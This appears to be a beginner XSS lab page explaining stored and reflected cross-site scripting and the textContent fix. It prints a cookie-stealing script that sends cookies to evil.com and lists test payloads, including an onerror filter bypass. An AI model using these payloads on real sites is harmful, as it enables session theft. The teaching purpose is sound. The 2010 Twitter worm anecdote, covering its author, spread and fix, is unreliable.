Activity 5: Digital Graffiti

XSS Challenge: Message Mischief!

Ever wonder if someone could mess with a website's messages? This challenge shows you how! XSS (Cross-Site Scripting) is like sneaking a hidden message onto a bulletin board that everyone sees, even if it's not supposed to be there. Type some special code into the box and see if you can make something unexpected happen! (Don't worry, you're just playing with a pretend website here, so it's safe to experiment!)

Imagine a school bulletin board where anyone can post a note. What if someone posted a note that said: “If you read this, you have to give me your lunch money!” — that’s kind of what XSS is, but for websites.

XSS happens when a hacker hides a script (a tiny computer program) inside a message or comment on a website. When other users visit that page, the script runs in their browser silently — potentially stealing their login cookies, passwords, or personal data.

How websites stop it: Good websites sanitize (clean up) all user input before showing it to others — stripping out any script tags or dangerous code. If you type <script> and nothing happens, that’s the sanitizer doing its job!

What's Actually at Risk

What an XSS Attack Can Really Do

An alert pop-up is just the demo. In the real world, attackers use XSS to do much more damage silently.

🍪 Cookie Theft

Your login session is stored in something called a cookie. If an attacker injects this into a page you visit:

<script> new Image().src = "https://evil.com/steal?c=" + document.cookie; </script>

Your cookies — including your login session — get sent to the attacker's server. They can now log in as you, without ever knowing your password.

📋 Stored vs. Reflected XSS

Stored XSS — The malicious script is saved into the site's database (e.g. in a comment or username). Every user who loads the page runs the attack automatically. This is the most dangerous type.

Reflected XSS — The attack travels in a link. The victim clicks a crafted URL, and the script bounces off the server back to their browser. Common in phishing emails.

Both types run in your browser as if the website itself sent the code — so your browser trusts it completely.

🛡️ The Fix: Never Use innerHTML

The #1 cause of XSS is using innerHTML to display user input. It executes any script tags inside it.

// ❌ Vulnerable — runs any script div.innerHTML = userInput; // ✅ Safe — treats input as plain text div.textContent = userInput;

Using textContent instead of innerHTML is one of the most important habits a web developer can have.

Try These in the Lab

XSS Payloads to Experiment With

Copy any of these into the input box below. Some will trigger alerts, some won't — try to figure out why.

🧪 Test Payloads

  • <script>alert('XSS!')</script> The classic. If the site uses innerHTML, this pops an alert.
  • <img src=x onerror=alert('XSS via image!')> No script tag needed — the broken image triggers JavaScript via the onerror event. Bypasses basic filters.
  • <b>I made this text bold!</b> Even without JavaScript, HTML injection lets attackers change how a page looks — a stepping stone to social engineering.
  • <a href="https://evil.com">Click here to win!</a> Injects a fake link into the page. Visitors could be redirected to phishing sites.

💣 Real World: Twitter Worm 2010

In 2010, a teenager named Masato Kinugawa discovered an XSS flaw in Twitter. He wrote a worm that — when a user just hovered their mouse over a tweet — automatically retweeted the payload to all their followers.

The worm spread to over 600,000 accounts in minutes before Twitter could patch it. No click was required. Just a mouse hover.

Twitter's fix? Replace innerHTML with textContent in the tweet rendering code. One word change stopped the whole thing.

innerHTML → textContent. That's it. That's the fix.
